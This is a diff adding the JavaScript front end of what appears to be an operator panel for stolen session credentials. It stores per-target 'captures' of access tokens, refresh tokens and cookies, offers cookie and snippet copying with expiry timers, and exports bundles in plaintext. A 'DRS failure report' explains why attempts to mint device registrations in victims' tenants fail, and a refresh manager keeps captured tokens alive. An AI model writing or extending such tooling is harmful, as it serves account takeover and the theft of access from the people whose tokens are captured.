+                style="width:100%; height:auto; min-height:180px; padding:14px;
+                       background: var(--bg-input); color: var(--text-dim);
+                       border: 1px solid var(--line);
+                       font-family: var(--font-mono); font-size: 11px; line-height: 1.6;
+                       white-space: pre-wrap; word-break: break-all; overflow-wrap: anywhere;
+                       overflow: hidden; resize: none; outline: none; display: block;"></textarea>
+        </div>
+
+        <div style="display:flex; align-items:center; justify-content:flex-end; gap:8px;
+                    padding: 14px 18px; border-top: 1px solid var(--line); background: var(--bg-elev);">
+            <button class="btn btn-xs close-btn-secondary">Close</button>
+            <button class="btn btn-xs copy-cookie">Copy cookie</button>
+            <button class="btn btn-xs btn-primary copy-snippet">Copy snippet</button>
+        </div>
+    `;
+
+    const snippetTa = box.querySelector('.snippet-value');
+    const cookieTa = box.querySelector('.cookie-value');
+    snippetTa.value = effectiveSnippet;
+    cookieTa.value = cookie;
+
+    function autosize(ta) {
+        ta.style.height = 'auto';
+        ta.style.height = ta.scrollHeight + 'px';
+    }
+    autosize(snippetTa);
+    autosize(cookieTa);
+
+    function refit() {
+        autosize(snippetTa);
+        autosize(cookieTa);
+    }
+    window.addEventListener('resize', refit);
+
+    let remaining = expiresIn;
+    const ttlEl = box.querySelector('.ttl');
+    const copyCookieBtn = box.querySelector('.copy-cookie');
+    const copySnippetBtn = box.querySelector('.copy-snippet');
+    const tick = setInterval(() => {
+        remaining -= 1;
+        if (remaining <= 0) {
+            clearInterval(tick);
+            ttlEl.textContent = '0';
+            ttlEl.style.color = 'var(--danger)';
+            ttlEl.parentElement.append(' (expired)');
+            copyCookieBtn.disabled = true;
+            copySnippetBtn.disabled = true;
+            copyCookieBtn.textContent = 'Expired';
+            copySnippetBtn.textContent = 'Expired';
+        } else {
+            ttlEl.textContent = remaining;
+        }
+    }, 1000);
+
+    async function copyFrom(textarea, button, originalLabel) {
+        try {
+            await navigator.clipboard.writeText(textarea.value);
+        } catch (e) {
+            textarea.select();
+            try { document.execCommand('copy'); }
+            catch (e2) {
+                showStatus('Clipboard copy failed — select and copy manually', 'warning');
+                return;
+            }
+        }
+        button.textContent = 'Copied';
+        setTimeout(() => { button.textContent = originalLabel; }, 1500);
+    }
+
+    copyCookieBtn.onclick = () => copyFrom(cookieTa, copyCookieBtn, 'Copy cookie');
+    copySnippetBtn.onclick = () => copyFrom(snippetTa, copySnippetBtn, 'Copy snippet');
+
+    function closeModal() {
+        clearInterval(tick);
+        window.removeEventListener('resize', refit);
+        overlay.remove();
+    }
+    box.querySelector('.close-btn').onclick = closeModal;
+    box.querySelector('.close-btn-secondary').onclick = closeModal;
+    overlay.addEventListener('click', (ev) => { if (ev.target === overlay) closeModal(); });
+    document.addEventListener('keydown', function escHandler(ev) {
+        if (ev.key === 'Escape') {
+            closeModal();
+            document.removeEventListener('keydown', escHandler);
+        }
+    });
+
+    overlay.appendChild(box);
+    document.body.appendChild(overlay);
+
+    requestAnimationFrame(() => {
+        autosize(snippetTa);
+        autosize(cookieTa);
+    });
+}
+
+/* ============================================================
+   DRS FAILURE REPORT
+   ============================================================ */
+async function showDrsReport() {
+    let data;
+    try {
+        const resp = await fetch('/api/drs/failure-report', {
+            headers: { Accept: 'application/json' }
+        });
+        if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+        data = await resp.json();
+    } catch (e) {
+        showStatus(`Failed to load DRS report: ${e.message}`, 'error');
+        return;
+    }
+
+    const existing = document.getElementById('drsReportOverlay');
+    if (existing) existing.remove();
+
+    const kindLabels = {
+        policy:      'Tenant policy',
+        device_cap:  'Device cap',
+        assignment:  'Not assigned',
+        consent:     'Consent required',
+        app_missing: 'DRS app missing',
+        schema:      'Schema rejection',
+        token:       'Token scope',
+        no_token:    'No token',
+        unknown:     'Unknown',
+    };
+
+    const summaryRows = Object.entries(data.by_kind || {})
+        .sort((a, b) => b[1] - a[1])
+        .map(([k, n]) => `
+            <tr>
+                <td style="padding:6px 10px; font-family:var(--font-mono);
+                           font-size:11px; color:var(--text);">${escapeHtml(kindLabels[k] || k)}</td>
+                <td style="padding:6px 10px; font-family:var(--font-mono);
+                           font-size:12px; color:var(--danger); text-align:right;">${n}</td>
+            </tr>`).join('');
+
+    const itemRows = (data.items || []).map(it => `
+        <tr>
+            <td style="padding:8px 10px; font-family:var(--font-mono); font-size:11px;
+                       color:var(--text); word-break:break-all;">${escapeHtml(it.email)}</td>
+            <td style="padding:8px 10px; font-family:var(--font-mono); font-size:10.5px;
+                       color:var(--danger); text-transform:uppercase;
+                       letter-spacing:0.08em; white-space:nowrap;">${escapeHtml(kindLabels[it.kind] || it.kind)}</td>
+            <td style="padding:8px 10px; font-family:var(--font-mono); font-size:10.5px;
+                       color:var(--text-dim); word-break:break-word;
+                       max-width:420px;">${escapeHtml(it.error || '')}</td>
+        </tr>`).join('');
+
+    const overlay = document.createElement('div');
+    overlay.id = 'drsReportOverlay';
+    overlay.style.cssText = `
+        position: fixed; inset: 0; background: rgba(0,0,0,0.78);
+        z-index: 9999; display: flex; align-items: center; justify-content: center;
+        padding: 16px; backdrop-filter: blur(4px);`;
+
+    const box = document.createElement('div');
+    box.style.cssText = `
+        background: var(--bg-panel); border: 1px solid var(--line);
+        width: 100%; max-width: 980px; max-height: 92vh; overflow-y: auto;
+        color: var(--text); font-family: var(--font-sans);
+        box-shadow: 0 24px 64px rgba(0,0,0,0.6);`;
+
+    box.innerHTML = `
+        <div style="display:flex; align-items:center; justify-content:space-between;
+                    padding: 14px 18px; border-bottom: 1px solid var(--line);
+                    background: var(--bg-elev);">
+            <div style="display:flex; align-items:center; gap:10px;">
+                <span style="width:3px; height:14px; background: var(--accent);"></span>
+                <span style="font-size:11px; letter-spacing:0.14em; text-transform:uppercase;
+                             color:var(--text); font-family:var(--font-mono); font-weight:700;">DRS failure report</span>
+                <span class="chip err" style="margin-left:8px;">${data.total || 0} failed</span>
+            </div>
+            <button class="dr-close" type="button" aria-label="Close"
+                    style="background:none; border:none; color:var(--text-dim); font-size:20px;
+                           cursor:pointer; padding:2px 8px; font-family:var(--font-mono);">&times;</button>
+        </div>
+
+        <div style="padding: 18px;">
+            ${data.total === 0
+                ? '<div style="padding:24px; text-align:center; color:var(--text-faint); font-family:var(--font-mono); font-size:11px; text-transform:uppercase; letter-spacing:0.08em;">No DRS failures recorded</div>'
+                : `
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom:18px;">
+                <div style="border:1px solid var(--line); background: var(--bg-input);">
+                    <div style="padding:10px 14px; border-bottom:1px solid var(--line);
+                                font-size:9.5px; letter-spacing:0.12em; text-transform:uppercase;
+                                color:var(--text-faint); font-family:var(--font-mono); font-weight:600;">By kind</div>
+                    <table style="width:100%; border-collapse:collapse;">${summaryRows}</table>
+                </div>
+                <div style="border:1px solid var(--line); background: var(--bg-input); padding:14px;
+                            font-size:11px; color:var(--text-dim); font-family:var(--font-mono);
+                            line-height:1.7;">
+                    The pre-flight check on each target uses these kinds to short-circuit
+                    re-enroll attempts. Targets showing <strong style="color:var(--text);">policy</strong>,
+                    <strong style="color:var(--text);">device cap</strong>,
+                    <strong style="color:var(--text);">not assigned</strong>, or
+                    <strong style="color:var(--text);">consent required</strong> are blocked
+                    tenant-side — clicking Mint on them returns instantly. The other kinds
+                    (schema, token, no token) usually need a fresh capture or a token re-import.
+                </div>
+            </div>
+
+            <div style="border:1px solid var(--line); background: var(--bg-input);">
+                <div style="padding:10px 14px; border-bottom:1px solid var(--line);
+                            font-size:9.5px; letter-spacing:0.12em; text-transform:uppercase;
+                            color:var(--text-faint); font-family:var(--font-mono); font-weight:600;">Targets</div>
+                <table style="width:100%; border-collapse:collapse;">
+                    <thead>
+                        <tr style="background: var(--bg-elev);">
+                            <th style="text-align:left; padding:8px 10px; font-size:9.5px;
+                                       letter-spacing:0.12em; text-transform:uppercase;
+                                       color:var(--text-faint); font-family:var(--font-mono);
+                                       font-weight:600;">Email</th>
+                            <th style="text-align:left; padding:8px 10px; font-size:9.5px;
+                                       letter-spacing:0.12em; text-transform:uppercase;
+                                       color:var(--text-faint); font-family:var(--font-mono);
+                                       font-weight:600;">Kind</th>
+                            <th style="text-align:left; padding:8px 10px; font-size:9.5px;
+                                       letter-spacing:0.12em; text-transform:uppercase;
+                                       color:var(--text-faint); font-family:var(--font-mono);
+                                       font-weight:600;">Error</th>
+                        </tr>
+                    </thead>
+                    <tbody>${itemRows}</tbody>
+                </table>
+            </div>`}
+        </div>
+
+        <div style="display:flex; align-items:center; justify-content:flex-end; gap:8px;
+                    padding: 14px 18px; border-top: 1px solid var(--line); background: var(--bg-elev);">
+            <button class="btn btn-xs dr-close">Close</button>
+        </div>
+    `;
+
+    const close = () => overlay.remove();
+    box.querySelectorAll('.dr-close').forEach(b => b.onclick = close);
+    overlay.addEventListener('click', ev => { if (ev.target === overlay) close(); });
+
+    overlay.appendChild(box);
+    document.body.appendChild(overlay);
+}
+
+/* ============================================================
+   IMPORT
+   ============================================================ */
+
+function triggerImport() {
+    const input = document.getElementById('vaultImportInput');
+    if (!input) return;
+    input.value = '';
+    input.click();
+}
+
+async function handleImportFile(event) {
+    const file = event.target && event.target.files && event.target.files[0];
+    if (!file) return;
+
+    if (file.size > 32 * 1024 * 1024) {
+        showStatus('Import file exceeds 32 MB limit', 'error');
+        return;
+    }
+
+    showStatus(`Importing ${file.name}…`, 'info');
+
+    try {
+        const form = new FormData();
+        form.append('file', file, file.name);
+
+        const resp = await fetch('/api/vault/import', {
+            method: 'POST',
+            body: form,
+            headers: { Accept: 'application/json' },
+        });
+
+        const data = await resp.json().catch(() => ({}));
+
+        if (!resp.ok || (!data.success && !data.total)) {
+            showStatus(
+                `Import failed: ${data.error || `HTTP ${resp.status}`}`,
+                'error'
+            );
+            return;
+        }
+
+        const parts = [];
+        if (data.imported) parts.push(`${data.imported} new`);
+        if (data.updated) parts.push(`${data.updated} updated`);
+        if (data.failed) parts.push(`${data.failed} failed`);
+
+        const summary = parts.join(' · ') || 'no changes';
+        const severity = data.failed
+            ? (data.imported || data.updated ? 'warning' : 'error')
+            : 'success';
+
+        showStatus(`Imported ${file.name}: ${summary}`, severity);
+
+        const failed = (data.results || []).filter(r => r.status === 'failed');
+        if (failed.length) {
+            console.groupCollapsed(`[import ${file.name}] ${failed.length} failed bundle(s)`);
+            failed.forEach(f => {
+                console.warn(`#${f.index} ${f.email || '(no email)'}: ${f.error || 'unknown error'}`);
+            });
+            console.groupEnd();
+        }
+
+        await loadVault(true);
+    } catch (e) {
+        showStatus(`Import error: ${e.message}`, 'error');
+    }
+}
+
+/* ---------- Export ---------- */
+async function exportRow(email, btn) {
+    if (!confirm(`Export full capture for ${email}?\n\nThis file contains the access token, refresh token, cookies, and user info in plaintext. Store it securely.`)) {
+        return;
+    }
+    const original = btn ? btn.textContent : '';
+    if (btn) { btn.disabled = true; btn.textContent = 'Exporting…'; }
+    try {
+        const resp = await fetch(`/api/vault/export/${encodeURIComponent(email)}`, {
+            headers: { Accept: 'application/json' }
+        });
+        if (!resp.ok) {
+            const err = await resp.json().catch(() => ({}));
+            throw new Error(err.error || `HTTP ${resp.status}`);
+        }
+
+        const text = await resp.text();
+        const filename = `${email.replace(/[^A-Za-z0-9._@-]/g, '_')}.${Date.now()}.json`;
+        const blob = new Blob([text], { type: 'application/json' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = filename;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        setTimeout(() => URL.revokeObjectURL(url), 1000);
+        showStatus(`Exported ${email}`, 'success');
+    } catch (e) {
+        showStatus(`Export failed: ${e.message}`, 'error');
+    } finally {
+        if (btn) { btn.disabled = false; btn.textContent = original || 'Export'; }
+    }
+}
+
+/* ---------- Delete ---------- */
+async function deleteRow(email, btn) {
+    if (!confirm(`Permanently delete capture for ${email}? This removes the target row and stored token.`)) return;
+    const original = btn ? btn.textContent : '';
+    if (btn) { btn.disabled = true; btn.textContent = 'Working…'; }
+    try {
+        const resp = await fetch(`/api/results/${encodeURIComponent(email)}/delete`, {
+            method: 'POST',
+            headers: { Accept: 'application/json' }
+        });
+        const data = await resp.json();
+        if (resp.ok && data.success) {
+            showStatus(`Deleted ${email}`, 'success');
+            await loadVault(true);
+        } else {
+            showStatus(`Delete failed: ${data.error || 'unknown'}`, 'error');
+        }
+    } catch (e) {
+        showStatus(`Delete error: ${e.message}`, 'error');
+    } finally {
+        if (btn) { btn.disabled = false; btn.textContent = original || 'Delete'; }
+    }
+}
+
+/* ============================================================
+   BOOT
+   ============================================================ */
+document.addEventListener('DOMContentLoaded', function () {
+    // ── Wire the search box explicitly ──────────────────────────────
+    // No inline oninput dependency. The listener is attached once, and
+    // survives everything because the search input is never re-rendered
+    // (only the tbody content is).
+    const searchInput = document.getElementById('vaultSearch');
+    if (searchInput) {
+        searchInput.addEventListener('input', debouncedLoad);
+
+        // Enter skips the debounce and searches immediately.
+        searchInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                if (_searchDebounce) {
+                    clearTimeout(_searchDebounce);
+                    _searchDebounce = null;
+                }
+                loadVault(true);
+            }
+            // Escape clears the search and reloads.
+            if (e.key === 'Escape' && searchInput.value) {
+                e.preventDefault();
+                searchInput.value = '';
+                if (_searchDebounce) {
+                    clearTimeout(_searchDebounce);
+                    _searchDebounce = null;
+                }
+                loadVault(true);
+            }
+        });
+    }
+
+    // Initial load
+    loadVault(true);
+
+    // ── Background auto-refresh ─────────────────────────────────────
+    // The vault is pull-only, but the refresh manager updates token
+    // state in the background. Re-fetch on a modest interval while the
+    // tab is visible so badges reflect reauth/dead/expired transitions
+    // without a manual Refresh.
+    const VAULT_AUTO_REFRESH_MS = 60000;
+    setInterval(() => {
+        if (document.visibilityState !== 'visible') return;
+        // Don't race the debounced search handler while the operator
+        // is mid-keystroke in the search field.
+        if (document.activeElement && document.activeElement.id === 'vaultSearch') return;
+        loadVault(false);
+    }, VAULT_AUTO_REFRESH_MS);
+}, { once: true });
+</script>
+</body>
+</html>
